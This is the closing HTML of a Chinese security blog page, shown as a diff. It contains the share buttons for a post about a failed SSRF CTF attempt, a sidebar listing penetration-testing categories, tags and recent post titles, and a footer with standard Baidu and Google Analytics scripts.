+            href="https://twitter.com/share?text=一次失败的CTF尝试记录（SSRF利用） - MyBlogs&url=http://example.com/2021/04/14/%E4%B8%80%E6%AC%A1%E5%A4%B1%E8%B4%A5%E7%9A%84CTF%E5%B0%9D%E8%AF%95%E8%AE%B0%E5%BD%95%EF%BC%88SSRF%E5%88%A9%E7%94%A8%EF%BC%89/">
+            <box-icon type='logo' name='twitter'></box-icon>
+        </a>
+        <a class="share-item" target="_blank"
+            href="https://www.facebook.com/sharer.php?title=一次失败的CTF尝试记录（SSRF利用） - MyBlogs&u=http://example.com/2021/04/14/%E4%B8%80%E6%AC%A1%E5%A4%B1%E8%B4%A5%E7%9A%84CTF%E5%B0%9D%E8%AF%95%E8%AE%B0%E5%BD%95%EF%BC%88SSRF%E5%88%A9%E7%94%A8%EF%BC%89/">
+            <box-icon name='facebook-square' type='logo' ></box-icon>
+        </a>
+        <!-- <a class="share-item" target="_blank"
+            href="https://service.weibo.com/share/share.php?title=一次失败的CTF尝试记录（SSRF利用） - MyBlogs&url=http://example.com/2021/04/14/%E4%B8%80%E6%AC%A1%E5%A4%B1%E8%B4%A5%E7%9A%84CTF%E5%B0%9D%E8%AF%95%E8%AE%B0%E5%BD%95%EF%BC%88SSRF%E5%88%A9%E7%94%A8%EF%BC%89/&pic=">
+            <div class="n-icon n-icon-weibo"></div>
+        </a> -->
+    </section>
+
+</article>
+
+
+
+
+
+
+
+
+
+
+
+
+<script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+</div>
+                </section>
+            </section>
+
+            
+            <aside class="sidebar ">
+                
+
+
+<div class="widget" id="widget">
+    
+      
+  <div class="widget-wrap">
+    <div class="widget-inner">
+      <div class="toc post-toc-html"></div>
+    </div>
+  </div>
+
+    
+      
+  <div class="widget-wrap widget-cate">
+    <div class="widget-title"><span>Categories</span></div>
+    <div class="widget-inner">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E6%B8%97%E9%80%8F/">Web渗透</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/">工具使用</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/">开发语言</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/">操作系统</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/">数据库</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%9D%82%E9%A1%B9/">杂项</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BA%AF%E6%BA%90%E5%8F%8D%E5%88%B6/">溯源反制</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/">环境配置</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E8%84%9A%E6%9C%AC%E5%BC%80%E5%8F%91/">脚本开发</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E8%BF%90%E7%BB%B4/">运维</a></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget-wrap widget-tags">
+    <div class="widget-title"><span>Tags</span></div>
+    <div class="widget-inner">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ARL/" rel="tag">ARL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Access/" rel="tag">Access</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Bugku/" rel="tag">Bugku</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Burpsuite/" rel="tag">Burpsuite</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Cap-Pwd/" rel="tag">Cap_Pwd</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CobaltStrike/" rel="tag">CobaltStrike</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/GetShell/" rel="tag">GetShell</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Goby/" rel="tag">Goby</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Java/" rel="tag">Java</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Kali/" rel="tag">Kali</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Lfi/" rel="tag">Lfi</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Mysql/" rel="tag">Mysql</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Oracle/" rel="tag">Oracle</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Proxy/" rel="tag">Proxy</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Pth/" rel="tag">Pth</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Python/" rel="tag">Python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RCE/" rel="tag">RCE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SSRF/" rel="tag">SSRF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Sql/" rel="tag">Sql</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Tools/" rel="tag">Tools</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/VulLab/" rel="tag">VulLab</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Xff/" rel="tag">Xff</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Xray/" rel="tag">Xray</a></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget-wrap widget-recent-posts">
+    <div class="widget-title"><span>Recent Posts</span></div>
+    <div class="widget-inner">
+      <ul>
+        
+          <li>
+            <a href="/2021/11/18/hello-world/">Hello World</a>
+          </li>
+        
+          <li>
+            <a href="/2021/08/15/%E5%8F%8D%E5%88%B6Goby%E6%89%AB%E6%8F%8F%E4%B9%8BXSS%E7%82%B9%E5%87%BB%E4%B8%8A%E7%BA%BF/">反制Goby扫描之XSS点击上线</a>
+          </li>
+        
+          <li>
+            <a href="/2021/08/11/docx%E6%89%B9%E9%87%8F%E8%BD%ACmarkdown%E8%84%9A%E6%9C%AC%E5%88%86%E4%BA%AB/">docx批量转markdown脚本分享</a>
+          </li>
+        
+          <li>
+            <a href="/2021/08/02/CS%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80%E5%AE%9E%E8%B7%B5/">CS分离免杀实践</a>
+          </li>
+        
+          <li>
+            <a href="/2021/06/17/WEB%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%9F%A5%E8%AF%86%E6%A2%B3%E7%90%86-%E6%B3%A8%E5%85%A5%E7%B1%BB-1-SQL%E6%B3%A8%E5%85%A5-Oracle/">渗透测试知识梳理-注入类-1-SQL注入-Oracle</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+    
+      
+  <div class="widget-wrap widget-archive">
+    <div class="widget-title"><span>Archive</span></div>
+    <div class="widget-inner">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/">2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/">2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/">2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/">2018</a></li></ul>
+    </div>
+  </div>
+
+
+    
+</div>
+
+<div id="backtop"><i class="icon icon-arrow-up"></i></div>
+            </aside>
+            
+        </div>
+    </div>
+
+    <footer class="footer">
+    <div class="footer-wave">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1440 320"><path fill="#3c4859" fill-opacity="1" d="M0,160L60,181.3C120,203,240,245,360,240C480,235,600,181,720,186.7C840,192,960,256,1080,261.3C1200,267,1320,213,1380,186.7L1440,160L1440,320L1380,320C1320,320,1200,320,1080,320C960,320,840,320,720,320C600,320,480,320,360,320C240,320,120,320,60,320L0,320Z"></path></svg>
+    </div>
+
+    <div class="footer-wrap">
+        <div class="footer-inner"> 
+            MyBlogs &copy; 2021<br>
+            Powered By Hexo · Theme By <a href="https://github.com/lh1me/hexo-theme-aomori" target="_blank">Aomori</a>
+        </div>
+    </div>
+
+</footer>
+
+
+
+
+
+
+<script src="/dist/build.js?1637200696663.js"></script>
+
+
+<script src="/dist/custom.js?1637200696663.js"></script>
+
+
+
+<!-- 百度链接提交 -->
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        }
+        else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+
+
+<!-- Google Analytics-->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-XXXXX-X"></script>
+<script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag() { dataLayer.push(arguments); }
+    gtag('js', new Date());
+    gtag('config', 'UA-XXXXX-X');
+</script>
+
+
+
+
+
+</body>
+
+</html>
